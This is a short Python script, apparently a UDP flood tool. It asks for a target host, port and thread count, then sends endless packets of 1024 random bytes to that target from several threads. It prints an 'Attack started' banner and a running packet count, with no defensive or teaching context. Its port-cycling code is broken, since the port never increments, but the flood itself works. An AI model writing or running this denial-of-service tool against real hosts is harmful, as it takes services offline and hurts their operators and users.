import socket, os, random, time, threading
from datetime import datetime

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

ip = str(input("Host/Ip: "))
port = int(input("Port: "))
threads = int(input("Threads: "))
   
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
data = random._urandom(1024)
addr = (str(ip), int(port))

print("Attack started on {0}.{1} | {2}-{3}-{4}".format(hour, minute, day, month, year), end = "\n")
time.sleep(3)

def run():
    global port
    sent = 0
    while True:
        sock.sendto(data, addr)
        sent += 1
        print("Sent %s packets to %s throught port: %s"%(sent,ip,port))
        if port == 65534:
            port = 1
               

for y in range(threads):
    th = threading.Thread(target = run)
    th.start()

if __name__ == '__main__': 
    run()
